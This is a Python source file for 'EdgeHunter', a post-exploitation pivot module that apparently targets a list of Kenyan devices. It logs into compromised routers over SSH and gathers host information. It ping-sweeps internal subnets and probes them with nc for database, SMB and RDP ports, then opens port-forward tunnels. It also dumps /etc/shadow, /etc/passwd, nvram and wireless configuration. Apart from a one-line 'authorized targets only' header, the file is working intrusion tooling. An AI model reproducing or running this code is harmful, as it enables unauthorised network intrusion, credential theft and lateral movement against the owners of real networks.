# EdgeHunter - Pivot Module v1.3
# Post-exploitation lateral movement
# USE ON AUTHORIZED TARGETS ONLY

import socket
import subprocess
import threading
import paramiko
import requests
import urllib3
from data.kenya_devices import KENYA_DEVICES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Pivot:
    def __init__(self):
        self.compromised_devices = []
        self.internal_hosts = []
        self.ssh_client = None
        self.lock = threading.Lock()

    def connect_ssh(self, ip, username, password):
        """Establish SSH connection to compromised device"""
        print(f"\n[*] Connecting to {ip} via SSH...")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(
                paramiko.AutoAddPolicy()
            )
            client.connect(
                ip,
                username=username,
                password=password,
                timeout=5,
                look_for_keys=False,
                allow_agent=False
            )
            self.ssh_client = client
            print(f"[+] Connected to {ip} as {username}")
            return client
        except Exception as e:
            print(f"[-] SSH connection failed: {e}")
            return None

    def execute_command(self, command):
        """Execute command on compromised device"""
        if not self.ssh_client:
            print("[-] No active SSH connection")
            return None
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(
                command
            )
            output = stdout.read().decode("utf-8", errors="ignore")
            error = stderr.read().decode("utf-8", errors="ignore")
            return output or error
        except Exception as e:
            print(f"[-] Command execution failed: {e}")
            return None

    def get_device_info(self):
        """Get information about compromised device"""
        print("\n[*] Gathering device information...")

        commands = {
            "hostname": "hostname",
            "whoami": "whoami",
            "os": "uname -a",
            "interfaces": "ip addr show || ifconfig",
            "routes": "ip route || route -n",
            "arp_table": "arp -a",
            "connections": "netstat -an || ss -an",
            "processes": "ps aux || ps"
        }

        info = {}
        for name, cmd in commands.items():
            result = self.execute_command(cmd)
            if result:
                info[name] = result.strip()
                print(f"[+] {name}: {result.strip()[:100]}")

        return info

    def discover_internal_network(self):
        """Discover internal network from compromised device"""
        print("\n[*] Discovering internal network...")

        # Get ARP table - fastest way to find hosts
        arp_output = self.execute_command("arp -a")
        hosts = []

        if arp_output:
            import re
            # Parse ARP table
            ip_pattern = r'\((\d+\.\d+\.\d+\.\d+)\)'
            found_ips = re.findall(ip_pattern, arp_output)

            for ip in found_ips:
                hosts.append(ip)
                print(f"[+] Found host: {ip}")

        # Get routing table to find networks
        routes = self.execute_command("ip route")
        if routes:
            print(f"\n[+] Routing table:\n{routes}")

        # Scan common subnets
        interfaces = self.execute_command("ip addr show")
        if interfaces:
            import re
            # Find all IPs on device
            ip_pattern = r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)'
            matches = re.findall(ip_pattern, interfaces)

            for ip, prefix in matches:
                if not ip.startswith("127"):
                    network = self._get_network(ip, prefix)
                    print(f"\n[*] Scanning network: {network}")
                    network_hosts = self._scan_through_device(
                        network
                    )
                    hosts.extend(network_hosts)

        self.internal_hosts = list(set(hosts))
        print(f"\n[+] Total internal hosts found: {len(self.internal_hosts)}")
        return self.internal_hosts

    def _get_network(self, ip, prefix):
        """Calculate network address"""
        import ipaddress
        network = ipaddress.IPv4Network(
            f"{ip}/{prefix}",
            strict=False
        )
        return str(network)

    def _scan_through_device(self, network):
        """Scan network through compromised device"""
        print(f"[*] Scanning {network} through compromised device...")

        # Use device's own ping/nmap to scan
        scan_cmd = f"for i in $(seq 1 254); do ping -c1 -W1 {network.rsplit('.', 1)[0]}.$i > /dev/null 2>&1 && echo {network.rsplit('.', 1)[0]}.$i is up; done"

        result = self.execute_command(scan_cmd)
        hosts = []

        if result:
            for line in result.split("\n"):
                if "is up" in line:
                    ip = line.split()[0]
                    hosts.append(ip)
                    print(f"[+] Found: {ip}")

        return hosts

    def identify_high_value_targets(self, hosts):
        """Identify high value targets in internal network"""
        print("\n[*] Identifying high value targets...")

        HIGH_VALUE_PORTS = {
            445: "SMB - Windows File Sharing",
            3389: "RDP - Remote Desktop",
            1433: "MSSQL Database",
            3306: "MySQL Database",
            5432: "PostgreSQL Database",
            6379: "Redis Database",
            27017: "MongoDB Database",
            8080: "Web Application",
            8443: "Secure Web Application",
            9200: "Elasticsearch",
            2049: "NFS File Share",
            21: "FTP Server",
            23: "Telnet",
        }

        high_value = []

        for host in hosts:
            print(f"\n[*] Checking {host}...")
            open_ports = []

            # Scan through compromised device
            for port in HIGH_VALUE_PORTS.keys():
                check_cmd = f"nc -zw1 {host} {port} 2>&1 && echo OPEN"
                result = self.execute_command(check_cmd)

                if result and "OPEN" in result:
                    service = HIGH_VALUE_PORTS[port]
                    open_ports.append((port, service))
                    print(f"[+] {host}:{port} — {service}")

            if open_ports:
                high_value.append({
                    "ip": host,
                    "ports": open_ports,
                    "risk": "HIGH" if any(
                        p in [445, 3389, 1433, 3306]
                        for p, _ in open_ports
                    ) else "MEDIUM"
                })

        return high_value

    def setup_tunnel(self, local_port, remote_host, remote_port):
        """Setup SSH tunnel through compromised device"""
        if not self.ssh_client:
            print("[-] No active SSH connection")
            return False

        print(f"\n[*] Setting up tunnel...")
        print(f"[*] localhost:{local_port} -> {remote_host}:{remote_port}")

        try:
            transport = self.ssh_client.get_transport()
            transport.request_port_forward("", local_port)

            print(f"[+] Tunnel established!")
            print(f"[+] Connect to localhost:{local_port}")
            print(f"[+] Traffic will be forwarded to {remote_host}:{remote_port}")
            return True

        except Exception as e:
            print(f"[-] Tunnel failed: {e}")
            return False

    def dump_router_config(self):
        """Dump router configuration for analysis"""
        print("\n[*] Dumping router configuration...")

        config_commands = [
            "cat /etc/config/*",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /etc/wireless",
            "nvram show",
            "uci show",
        ]

        config_data = {}
        for cmd in config_commands:
            result = self.execute_command(cmd)
            if result and "not found" not in result.lower():
                config_data[cmd] = result
                print(f"[+] Got data from: {cmd}")

        return config_data

    def full_pivot(self, ip, username, password):
        """Full pivot chain"""
        print("\n" + "="*50)
        print("   EDGEHUNTER - PIVOT MODULE")
        print("="*50)

        # Step 1 - Connect
        client = self.connect_ssh(ip, username, password)
        if not client:
            return False

        # Step 2 - Device info
        info = self.get_device_info()

        # Step 3 - Discover network
        hosts = self.discover_internal_network()

        # Step 4 - Find high value targets
        if hosts:
            targets = self.identify_high_value_targets(hosts)

            print("\n[*] HIGH VALUE TARGETS:")
            for target in targets:
                print(f"[!!!] {target['ip']} — Risk: {target['risk']}")
                for port, service in target['ports']:
                    print(f"      Port {port}: {service}")

        # Step 5 - Dump config
        config = self.dump_router_config()

        print("\n[+] Pivot complete!")
        return {
            "device_info": info,
            "internal_hosts": hosts,
            "config": config
        }